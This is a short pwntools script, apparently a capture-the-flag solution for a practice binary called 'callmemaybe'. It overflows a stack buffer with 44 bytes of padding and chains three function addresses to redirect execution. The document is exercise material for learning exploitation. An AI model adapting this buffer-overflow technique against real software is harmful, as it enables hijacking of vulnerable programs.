from pwn import *

elf = ELF("./source/callmemaybe")

io = process("./source/callmemaybe")

padding = b"A" * 44;

and_this_is_crazy = p32(elf.symbols["and_this_is_crazy"])
but_heres_my_number = p32(elf.symbols["but_heres_my_number"])
so_call_me_maybe = p32(elf.symbols["so_call_me_maybe"])

io.recv()
io.sendline(padding + and_this_is_crazy + but_heres_my_number + so_call_me_maybe)

print(io.recvline())
